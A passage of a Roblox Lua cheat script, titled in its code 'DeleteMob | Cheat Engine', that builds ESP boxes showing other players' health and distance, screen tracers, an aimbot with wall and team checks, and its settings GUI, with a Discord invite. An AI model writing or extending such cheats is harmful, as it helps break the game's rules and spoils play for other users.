        local info = Instance.new("BillboardGui", bbg)
        info.Name = "info"
        info.Size = UDim2.new(3,0,0,54)
        info.StudsOffset = Vector3.new(3.6,-3,0)
        info.AlwaysOnTop = true
        info.ClipsDescendants = false
        info.Enabled = false
        local namelabel = Instance.new("TextLabel", info)
        namelabel.Name = "namelabel"
        namelabel.BackgroundTransparency = 1
        namelabel.TextStrokeTransparency = 0
        namelabel.TextXAlignment = Enum.TextXAlignment.Left
        namelabel.Size = UDim2.new(0,100,0,18)
        namelabel.Position = UDim2.new(0,0,0,0)
        namelabel.Text = player.Name
        local distancel = Instance.new("TextLabel", info)
        distancel.Name = "distancelabel"
        distancel.BackgroundTransparency = 1-- Made By Mick Gordon
        distancel.TextStrokeTransparency = 0
        distancel.TextXAlignment = Enum.TextXAlignment.Left
        distancel.Size = UDim2.new(0,100,0,18)
        distancel.Position = UDim2.new(0,0,0,18)
        local healthl = Instance.new("TextLabel", info)
        healthl.Name = "healthlabel"
        healthl.BackgroundTransparency = 1
        healthl.TextStrokeTransparency = 0
        healthl.TextXAlignment = Enum.TextXAlignment.Left
        healthl.Size = UDim2.new(0,100,0,18)
        healthl.Position = UDim2.new(0,0,0,36)
    
        local uill = Instance.new("UIListLayout", info)
    
        local forhealth = Instance.new("BillboardGui", bbg)
        forhealth.Name = "forhealth"
        forhealth.Size = UDim2.new(4.5,0,6,0)
        forhealth.AlwaysOnTop = true
        forhealth.ClipsDescendants = false
        forhealth.Enabled = false
    
        local healthbar = Instance.new("Frame", forhealth)
        healthbar.Name = "healthbar"
        healthbar.BackgroundColor3 = Color3.fromRGB(40,40,40)
        healthbar.BorderColor3 = Color3.fromRGB(0,0,0)
        healthbar.Size = UDim2.new(0.04,0,0.9,0)
        healthbar.Position = UDim2.new(0,0,0.05,0)
        local bar = Instance.new("Frame", healthbar)
        bar.Name = "bar"
        bar.BorderSizePixel = 0
        bar.BackgroundColor3 = Color3.fromRGB(94,255,69)
        bar.AnchorPoint = Vector2.new(0,1)
        bar.Position = UDim2.new(0,0,1,0)
        bar.Size = UDim2.new(1,0,1,0)
    
        -- Made By Mick Gordon
        local co = coroutine.create(function()
            while wait(0.1) do
                if player ~= PLAYER and player and player.Character and player.Character.FindFirstChild(player.Character, "Humanoid") and player.Character.Humanoid.Health > 0 then
                    bbg.Adornee = player.Character.HumanoidRootPart
                    info.Adornee = player.Character.HumanoidRootPart
                    forhealth.Adornee = player.Character.HumanoidRootPart
    
                    if DeleteMob.ESP.Box.Box == true then
                        outlines.Visible = true
                    else
                        outlines.Visible = false
                    end
    
                    outlines.BackgroundTransparency = 1
    
                    if DeleteMob.ESP.Box.Health == true then
                        if player.Character:FindFirstChild("Humanoid") ~= nil then
                            healthl.Text = "Health: "..math.floor(player.Character:FindFirstChild"Humanoid".Health)
                            healthbar.bar.Size = UDim2.new(1,0,player.Character:FindFirstChild"Humanoid".Health/player.Character:FindFirstChild"Humanoid".MaxHealth,0)
                        end
                        if DeleteMob.ESP.Box.HealthType == "Text" then
                            healthbar.Visible = false
                            healthl.Visible = true
                        end-- Made By Mick Gordon
                        if DeleteMob.ESP.Box.HealthType == "Bar" then
                            healthl.Visible = false
                            healthbar.Visible = true
                        end
                        if DeleteMob.ESP.Box.HealthType == "Both" then
                            healthl.Visible = true
                            healthbar.Visible = true
                        end
                    else
                        healthl.Visible = false
                        healthbar.Visible = false
                    end
    
    
                    if DeleteMob.ESP.Box.Name then
                        namelabel.Visible = true
                    else
                        namelabel.Visible = false
                    end
    
                    -- Made By Mick Gordon
                    if DeleteMob.ESP.Box.Distance == true then
                        distancel.Visible = true
                        if PLAYER.Character and PLAYER.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                            distancel.Text = "Distance: "..math.floor(0.5+(PLAYER.Character:FindFirstChild"HumanoidRootPart".Position - player.Character:FindFirstChild"HumanoidRootPart".Position).magnitude)
                        end
                    else
                        distancel.Visible = false
                    end
    
    
                    if DeleteMob.ESP.Box.TeamCheck == true and player.TeamColor == PLAYER.TeamColor then
                        bbg.Enabled = false
                        info.Enabled = false
                        forhealth.Enabled = false
                    else
                        bbg.Enabled = true
                        info.Enabled = true
                        forhealth.Enabled = true
                    end
                    -- Made By Mick Gordon
    
                    if DeleteMob.ESP.Box.TeamColor == true then
                        left.BackgroundColor3 = player.TeamColor.Color
                        right.BackgroundColor3 = player.TeamColor.Color
                        up.BackgroundColor3 = player.TeamColor.Color
                        down.BackgroundColor3 = player.TeamColor.Color
                        outlines.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                    else
                        outlines.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        left.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        right.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        up.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        down.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        healthl.TextColor3 = DeleteMob.ESP.Box.BoxColor
                        distancel.TextColor3 = DeleteMob.ESP.Box.BoxColor
                        namelabel.TextColor3 = DeleteMob.ESP.Box.BoxColor
                    end
    
                    if not (game:GetService"Players":FindFirstChild(player.Name)) then
                        BoxC:FindFirstChild(player.Name):Destroy()
                        coroutine.yield()
                    end-- Made By Mick Gordon
                else
                    bbg.Enabled = false
                    bbg.Adornee = nil
                    info.Adornee = nil
                    info.Enabled = false
                    forhealth.Adornee = nil
                    forhealth.Enabled = false
                end
            end 
        end)
        coroutine.resume(co)
    end
    
    
    local function AddTracers(Player) -- Tracers Without Lib OMG !!!!
        local tracer = Instance.new("Frame") -- Idk What I Was Smoking When Making This Scrip Hub, It Is Shit And I Will Remake Later 
        tracer.Parent = TracersG
        tracer.Name = Player.Name
        tracer.Active = false
        tracer.AnchorPoint = Vector2.new(.5, .5)
        tracer.Visible = false
    
        local co = coroutine.create(function()
            game:GetService("RunService").RenderStepped:Connect(function()
                if Player ~= PLAYER and Player and Player.Character and Player.Character.FindFirstChild(Player.Character, "Humanoid") and Player.Character.Humanoid.Health > 0 then
                    local TargetPart = Player.Character:FindFirstChild("HumanoidRootPart")
                    local ScreenPoint, OnScreen = CurrentCam:WorldToScreenPoint(TargetPart.Position)
                    local distance 
                    -- Made By Mick Gordon
                    distance = math.floor(0.5+(game.Workspace.CurrentCamera.CFrame.Position - Player.Character:WaitForChild("HumanoidRootPart").Position).magnitude)
    
                    local screenpointmain = Vector2.new(ScreenPoint.X, ScreenPoint.Y + (2500 / distance)) --  / distance so it can be at the bottom of the box.
                    local posd = UIS:GetMouseLocation()
                    local MouseOrigin = Vector2.new(posd.X, posd.Y - 36)
                    local Origin = Vector2.new(CurrentCam.ViewportSize.X/2, CurrentCam.ViewportSize.Y - 1)
                    local Position = (Origin + screenpointmain) / 2
                    local Length = (Origin - screenpointmain).Magnitude
                    tracer.Rotation = math.deg(math.atan2(screenpointmain.Y - Origin.Y, screenpointmain.X - Origin.X))
    
    
                    Position = (Origin + screenpointmain) / 2
                    Length = (Origin - screenpointmain).Magnitude
                    tracer.Rotation = math.deg(math.atan2(screenpointmain.Y - Origin.Y, screenpointmain.X - Origin.X))
    
    
                    if OnScreen then
                        if DeleteMob.ESP.Tracers.Enabled == true and OnScreen then
                            if DeleteMob.ESP.Tracers.TeamCheck == true then
                                if Player.TeamColor == PLAYER.TeamColor then
                                    tracer.Visible = false
                                else
                                    tracer.Visible = true
                                end
                            else -- Made By Mick Gordon
                                tracer.Visible = true
                            end
                        else
                            tracer.Visible = false
                        end-- Made By Mick Gordon
    
                        if DeleteMob.ESP.Tracers.TeamColor == true then
                            tracer.BackgroundColor3 = Player.TeamColor.Color
                        else
                            tracer.BackgroundColor3 = DeleteMob.ESP.Tracers.Color
                        end
    
                        tracer.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        tracer.Position = UDim2.new(0, Position.X, 0, Position.Y)
                        tracer.Size = UDim2.new(0, Length, 0, 2)
                    else
                        tracer.Visible = false
                    end
    
                    if not (game:GetService"Players":FindFirstChild(Player.Name)) then
                        Fov:FindFirstChild(Player.Name):Destroy()
                        coroutine.yield()
                    end
                else
                    tracer.Visible = false
                end
            end)
        end)
        coroutine.resume(co)-- Made By Mick Gordon
    end
    
    function isVisible(p, ...)
        
        if not (DeleteMob.Aimbot.WallCheck == true) then
            return true
        end
        
        return #CurrentCam:GetPartsObscuringTarget({ p }, { CurrentCam, PLAYER.Character, ... }) == 0 
    end-- Made By Mick Gordon
    
    function CameraGetClosestToMouse(Fov)
        local AimFov = Fov
        local targetPos = nil
    
        for i,v in pairs (game:GetService("Players"):GetPlayers()) do
            if v ~= PLAYER then
                if DeleteMob.Aimbot.TeamCheck == true then
                    if v.Character and v.Character:FindFirstChild(DeleteMob.Aimbot.AimPart) and v.Character.Humanoid and v.Character.Humanoid.Health > 0 and not (v.Team == PLAYER.Team) then
                        local screen_pos, on_screen = WorldToViewportPoint(CurrentCam, v.Character[DeleteMob.Aimbot.AimPart].Position)
                        local screen_pos_2D = Vector2.new(screen_pos.X, screen_pos.Y)
                        local new_magnitude = (screen_pos_2D - mouseLocation(UIS)).Magnitude
                        if on_screen and new_magnitude < AimFov and isVisible(v.Character[DeleteMob.Aimbot.AimPart].Position, v.Character.Head.Parent) then
                            AimFov = new_magnitude
                            targetPos = v-- Made By Mick Gordon
                        end
                    end-- Made By Mick Gordon
                else
                    if v.Character and v.Character:FindFirstChild(DeleteMob.Aimbot.AimPart) and v.Character.Humanoid and v.Character.Humanoid.Health > 0 then
                        local screen_pos, on_screen = WorldToViewportPoint(CurrentCam, v.Character[DeleteMob.Aimbot.AimPart].Position)
                        local screen_pos_2D = Vector2.new(screen_pos.X, screen_pos.Y)
                        local new_magnitude = (screen_pos_2D - mouseLocation(UIS)).Magnitude
                        if on_screen and new_magnitude < AimFov and isVisible(v.Character[DeleteMob.Aimbot.AimPart].Position, v.Character.Head.Parent) then
                            AimFov = new_magnitude
                            targetPos = v
                        end
                    end
                end
            end
        end
        return targetPos
    end
    
    
    local function aimAt(pos, smooth)
        local AimPart = pos.Character:FindFirstChild(DeleteMob.Aimbot.AimPart)
        if AimPart then
            local LookAt = nil
            local Distance = math.floor(0.5+(PLAYER.Character:FindFirstChild"HumanoidRootPart".Position - pos.Character:FindFirstChild"HumanoidRootPart".Position).magnitude)
            if Distance > 100  then
                local distChangeBig = Distance / 10
                LookAt = CurrentCam.CFrame:PointToWorldSpace(Vector3.new(0,0,-smooth * distChangeBig)):Lerp(AimPart.Position,.01) -- No one esle do camera smoothing ? tf
            else-- Made By Mick Gordon
                local distChangeSmall = Distance / 10
                LookAt = CurrentCam.CFrame:PointToWorldSpace(Vector3.new(0,0,-smooth * distChangeSmall)):Lerp(AimPart.Position,.01) -- No one esle do camera smoothing ? tf
            end
            CurrentCam.CFrame = CFrame.lookAt(CurrentCam.CFrame.Position, LookAt)
        end
    end
    
    -- Cant Be Botherd To Clean This Up
    local CheatEngineDeleteMob = Instance.new("ScreenGui")
    local DeleteMobF = Instance.new("Frame")
    local TextBox = Instance.new("TextBox")
    local Name = Instance.new("TextLabel")
    local Line = Instance.new("Frame")
    local Line_2 = Instance.new("Frame")
    local AimBotSection = Instance.new("Frame")
    local UIListLayout = Instance.new("UIListLayout")
    local ABE = Instance.new("TextButton")
    local ABWC = Instance.new("TextButton")
    local ABTC = Instance.new("TextButton")
    local ABSF = Instance.new("TextButton")
    local Frame = Instance.new("Frame")
    local Slider3 = Instance.new("Frame")-- Made By Mick Gordon
    local UICorner = Instance.new("UICorner")
    local Fill1 = Instance.new("Frame")
    local UICorner_2 = Instance.new("UICorner")
    local UIGradient = Instance.new("UIGradient")
    local TriggerFov = Instance.new("TextButton")
    local Numbers = Instance.new("TextLabel")
    local TextLabel = Instance.new("TextLabel")
    local Frame_2 = Instance.new("Frame")
    local Slider4 = Instance.new("Frame")
    local UICorner_3 = Instance.new("UICorner")
    local Fill2 = Instance.new("Frame")
    local UICorner_4 = Instance.new("UICorner")
    local UIGradient_2 = Instance.new("UIGradient")
    local TriggerSmoothing = Instance.new("TextButton")-- Made By Mick Gordon
    local Numbers_2 = Instance.new("TextLabel")
    local TextLabel_2 = Instance.new("TextLabel")
    local TextLabel_3 = Instance.new("TextLabel")
    local Allways_Show = Instance.new("TextButton")
    local TextLabel_4 = Instance.new("TextLabel")
    local ESPSection = Instance.new("Frame")
    local UIListLayout_2 = Instance.new("UIListLayout")
    local BBE = Instance.new("TextButton")
    local BTC = Instance.new("TextButton")
    local BBN = Instance.new("TextButton")
    local BBD = Instance.new("TextButton")
    local BBH = Instance.new("TextButton")
    local TextLabel_5 = Instance.new("TextLabel")
    local BBHT = Instance.new("TextButton")
    local TextLabel_6 = Instance.new("TextLabel")
    local TextLabel_7 = Instance.new("TextLabel")
    local Frame_3 = Instance.new("Frame")
    local UIListLayout_3 = Instance.new("UIListLayout")
    local Box_R = Instance.new("TextBox")
    local Box_G = Instance.new("TextBox")
    local Box_B = Instance.new("TextBox")
    local TextLabel_8 = Instance.new("TextLabel")
    local ESPSection_2 = Instance.new("Frame")
    local UIListLayout_4 = Instance.new("UIListLayout")
    local OE = Instance.new("TextButton")
    local OTC = Instance.new("TextButton")-- Made By Mick Gordon
    local Frame_4 = Instance.new("Frame")
    local Slider1 = Instance.new("Frame")
    local UICorner_5 = Instance.new("UICorner")
    local Fill3 = Instance.new("Frame")
    local UICorner_6 = Instance.new("UICorner")
    local UIGradient_3 = Instance.new("UIGradient")
    local TriggerOutTans = Instance.new("TextButton")
    local Numbers_3 = Instance.new("TextLabel")
    local TextLabel_9 = Instance.new("TextLabel")
    local Frame_5 = Instance.new("Frame")
    local Slider2 = Instance.new("Frame")
    local UICorner_7 = Instance.new("UICorner")
    local Fill4 = Instance.new("Frame")
    local UICorner_8 = Instance.new("UICorner")
    local UIGradient_4 = Instance.new("UIGradient")
    local TriggerFill = Instance.new("TextButton")
    local Numbers_4 = Instance.new("TextLabel")
    local TextLabel_10 = Instance.new("TextLabel")
    local TextLabel_11 = Instance.new("TextLabel")
    local Frame_6 = Instance.new("Frame")
    local UIListLayout_5 = Instance.new("UIListLayout")
    local Outlines_R = Instance.new("TextBox")
    local Outlines_G = Instance.new("TextBox")
    local Outlines_B = Instance.new("TextBox")
    local TextLabel_12 = Instance.new("TextLabel")
    local Frame_7 = Instance.new("Frame")
    local UIListLayout_6 = Instance.new("UIListLayout")
    local FillOutlines_R = Instance.new("TextBox")
    local FillOutlines_G = Instance.new("TextBox")
    local FillOutlines_B = Instance.new("TextBox")
    local Tracerssection = Instance.new("Frame")
    local UIListLayout_7 = Instance.new("UIListLayout")
    local TE = Instance.new("TextButton")
    local TTC = Instance.new("TextButton")
    local TTCOlor = Instance.new("TextButton")
    local Frame_8 = Instance.new("Frame")
    local UIListLayout_8 = Instance.new("UIListLayout")
    local Tracers_R = Instance.new("TextBox")
    local Tracers_G = Instance.new("TextBox")
    local Tracers_B = Instance.new("TextBox")-- Made By Mick Gordon
    local Unknown = Instance.new("Frame")
    local UIListLayout_9 = Instance.new("UIListLayout")
    local TextLabel_13 = Instance.new("TextLabel")
    local TextLabel_14 = Instance.new("TextLabel")
    local Open = Instance.new("Frame")
    local TextButton = Instance.new("TextButton")
    
    --Properties:
    
    CheatEngineDeleteMob.Name = "CheatEngineDeleteMob"
    CheatEngineDeleteMob.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    CheatEngineDeleteMob.Enabled = true
    CheatEngineDeleteMob.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    CheatEngineDeleteMob.DisplayOrder = 10
    CheatEngineDeleteMob.ResetOnSpawn = false
    -- Made By Mick Gordon
    DeleteMobF.Name = "DeleteMobF"
    DeleteMobF.Parent = CheatEngineDeleteMob
    DeleteMobF.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    DeleteMobF.BorderColor3 = Color3.fromRGB(255, 255, 255)
    DeleteMobF.Position = UDim2.new(0.144998878, 0, 0.328040659, 0)
    DeleteMobF.Size = UDim2.new(0, 1213, 0, 398)
    DeleteMobF.ZIndex = 10
    DeleteMobF.Draggable = true
    DeleteMobF.Active = true
    
    TextBox.Parent = DeleteMobF
    TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.BackgroundTransparency = 1.000
    TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextBox.BorderSizePixel = 0
    TextBox.Position = UDim2.new(0.791149139, 0, 0.0127403988, 0)
    TextBox.Size = UDim2.new(0, 200, 0, 23)
    TextBox.ClearTextOnFocus = false
    TextBox.Font = Enum.Font.Roboto
    TextBox.PlaceholderText = "https://discord.gg/FsApQ7YNTq"
    TextBox.Text = "https://discord.gg/FsApQ7YNTq - Double Click Me"
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.TextSize = 14.000
    
    Name.Name = "Name"
    Name.Parent = DeleteMobF
    Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Name.BackgroundTransparency = 1.000
    Name.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Name.BorderSizePixel = 0
    Name.Position = UDim2.new(0.0178597774, 0, 0.00456260797, 0)
    Name.Size = UDim2.new(0, 200, 0, 31)
    Name.Font = Enum.Font.Gotham
    Name.Text = "DeleteMob | Cheat Engine"
    Name.TextColor3 = Color3.fromRGB(17, 223, 255)
    Name.TextSize = 19.000
    
    Line.Name = "Line"
    Line.Parent = DeleteMobF
    Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Line.BorderSizePixel = 0
    Line.Position = UDim2.new(0, 0, 0.0804020092, 0)
    Line.Size = UDim2.new(0, 1213, 0, 1)
    
    Line_2.Name = "Line"
    Line_2.Parent = DeleteMobF
    Line_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Line_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Line_2.BorderSizePixel = 0
    Line_2.Position = UDim2.new(0.205276027, 0, 0.0828348249, 0)
    Line_2.Size = UDim2.new(0, 1, 0, 365)
    -- Made By Mick Gordon
    AimBotSection.Name = "AimBotSection"
    AimBotSection.Parent = DeleteMobF
    AimBotSection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    AimBotSection.BackgroundTransparency = 1.000
    AimBotSection.BorderColor3 = Color3.fromRGB(0, 0, 0)
    AimBotSection.BorderSizePixel = 0
    AimBotSection.Position = UDim2.new(0.0604648069, 0, 0.160724282, 0)
    AimBotSection.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout.Parent = AimBotSection
    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Padding = UDim.new(0, 5)
    
    ABE.Name = "ABE"
    ABE.Parent = AimBotSection
    ABE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABE.Size = UDim2.new(0, 164, 0, 29)
    ABE.Font = Enum.Font.Gotham
    ABE.Text = "Enable"
    ABE.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABE.TextSize = 16.000
    
    ABWC.Name = "ABWC"
    ABWC.Parent = AimBotSection
    ABWC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABWC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABWC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABWC.Size = UDim2.new(0, 164, 0, 29)
    ABWC.Font = Enum.Font.Gotham
    ABWC.Text = "Wall Check"
    ABWC.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABWC.TextSize = 16.000
    
    ABTC.Name = "ABTC"
    ABTC.Parent = AimBotSection
    ABTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABTC.Size = UDim2.new(0, 164, 0, 29)
    ABTC.Font = Enum.Font.Gotham
    ABTC.Text = "Team Check"
    ABTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABTC.TextSize = 16.000
    
    ABSF.Name = "ABSF"
    ABSF.Parent = AimBotSection
    ABSF.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABSF.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABSF.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABSF.Size = UDim2.new(0, 164, 0, 29)
    ABSF.Font = Enum.Font.Gotham
    ABSF.Text = "Show Fov"
    ABSF.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABSF.TextSize = 16.000
    
    Frame.Parent = AimBotSection
    Frame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame.BackgroundTransparency = 0.700
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame.Size = UDim2.new(0, 230, 0, 50)
    
    Slider3.Name = "Slider3"
    Slider3.Parent = Frame
    Slider3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider3.BorderSizePixel = 0
    Slider3.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider3.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner.Parent = Slider3
    
    Fill1.Name = "Fill1"
    Fill1.Parent = Slider3
    Fill1.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill1.BackgroundTransparency = 0.200
    Fill1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill1.BorderSizePixel = 0
    Fill1.Size = UDim2.new(0, 100, 0, 15)
    
    UICorner_2.Parent = Fill1
    
    UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}
    UIGradient.Parent = Fill1
    -- Made By Mick Gordon
    TriggerFov.Name = "TriggerFov"
    TriggerFov.Parent = Slider3
    TriggerFov.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerFov.BackgroundTransparency = 1.000
    TriggerFov.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFov.BorderSizePixel = 0
    TriggerFov.Size = UDim2.new(1, 0, 1, 0)
    TriggerFov.Font = Enum.Font.SourceSans
    TriggerFov.Text = ""
    TriggerFov.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFov.TextSize = 14.000
    
    Numbers.Name = "Numbers"
    Numbers.Parent = Frame
    Numbers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers.BackgroundTransparency = 1.000
    Numbers.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers.BorderSizePixel = 0
    Numbers.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers.Size = UDim2.new(0, 50, 0, 23)
    Numbers.Font = Enum.Font.Gotham
    Numbers.Text = "350"
    Numbers.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers.TextSize = 14.000
    
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BorderSizePixel = 0
    TextLabel.Position = UDim2.new(0.0608695634, 0, 0, 0)
    TextLabel.Size = UDim2.new(0, 50, 0, 23)
    TextLabel.Font = Enum.Font.Gotham
    TextLabel.Text = "Fov"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextSize = 14.000
    
    Frame_2.Parent = AimBotSection
    Frame_2.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_2.BackgroundTransparency = 0.700
    Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderSizePixel = 0
    Frame_2.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame_2.Size = UDim2.new(0, 230, 0, 50)
    
    Slider4.Name = "Slider4"
    Slider4.Parent = Frame_2
    Slider4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider4.BorderSizePixel = 0
    Slider4.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider4.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner_3.Parent = Slider4
    
    Fill2.Name = "Fill2"
    Fill2.Parent = Slider4
    Fill2.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill2.BackgroundTransparency = 0.200
    Fill2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill2.BorderSizePixel = 0
    Fill2.Size = UDim2.new(0, 0, 0, 15)
    
    UICorner_4.Parent = Fill2
    
    UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}-- Made By Mick Gordon
    UIGradient_2.Parent = Fill2
    
    TriggerSmoothing.Name = "TriggerSmoothing"
    TriggerSmoothing.Parent = Slider4
    TriggerSmoothing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerSmoothing.BackgroundTransparency = 1.000
    TriggerSmoothing.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerSmoothing.BorderSizePixel = 0
    TriggerSmoothing.Size = UDim2.new(1, 0, 1, 0)
    TriggerSmoothing.Font = Enum.Font.SourceSans
    TriggerSmoothing.Text = ""
    TriggerSmoothing.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerSmoothing.TextSize = 14.000
    -- Made By Mick Gordon
    Numbers_2.Name = "Numbers"
    Numbers_2.Parent = Frame_2
    Numbers_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_2.BackgroundTransparency = 1.000
    Numbers_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_2.BorderSizePixel = 0
    Numbers_2.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers_2.Size = UDim2.new(0, 50, 0, 23)
    Numbers_2.Font = Enum.Font.Gotham
    Numbers_2.Text = "0"
    Numbers_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_2.TextSize = 14.000
    
    TextLabel_2.Parent = Frame_2
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BackgroundTransparency = 1.000
    TextLabel_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BorderSizePixel = 0
    TextLabel_2.Position = UDim2.new(0.0608695634, 0, 0, 0)
    TextLabel_2.Size = UDim2.new(0, 50, 0, 23)
    TextLabel_2.Font = Enum.Font.Gotham
    TextLabel_2.Text = "Smoothing"
    TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.TextSize = 14.000
    
    TextLabel_3.Parent = AimBotSection
    TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_3.BackgroundTransparency = 1.000
    TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_3.BorderSizePixel = 0
    TextLabel_3.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_3.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_3.Font = Enum.Font.Gotham
    TextLabel_3.Text = "Aim Part"
    TextLabel_3.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_3.TextSize = 21.000
    
    Allways_Show.Name = "Allways_Show"
    Allways_Show.Parent = AimBotSection
    Allways_Show.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Allways_Show.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Allways_Show.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    Allways_Show.Size = UDim2.new(0, 164, 0, 29)
    Allways_Show.Font = Enum.Font.Gotham
    Allways_Show.Text = "HEAD, torso"
    Allways_Show.TextColor3 = Color3.fromRGB(255, 255, 255)
    Allways_Show.TextSize = 16.000
    
    TextLabel_4.Parent = DeleteMobF
    TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_4.BackgroundTransparency = 1.000
    TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_4.BorderSizePixel = 0
    TextLabel_4.Position = UDim2.new(0.00569662312, 0, 0.100655407, 0)
    TextLabel_4.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_4.Font = Enum.Font.Gotham
    TextLabel_4.Text = "Aim Bot"
    TextLabel_4.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_4.TextSize = 18.000
    TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
    
    ESPSection.Name = "ESPSection"
    ESPSection.Parent = DeleteMobF
    ESPSection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ESPSection.BackgroundTransparency = 1.000
    ESPSection.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ESPSection.BorderSizePixel = 0
    ESPSection.Position = UDim2.new(0.26986298, 0, 0.160724282, 0)
    ESPSection.Size = UDim2.new(0, 100, 0, 334)
    -- Made By Mick Gordon
    UIListLayout_2.Parent = ESPSection
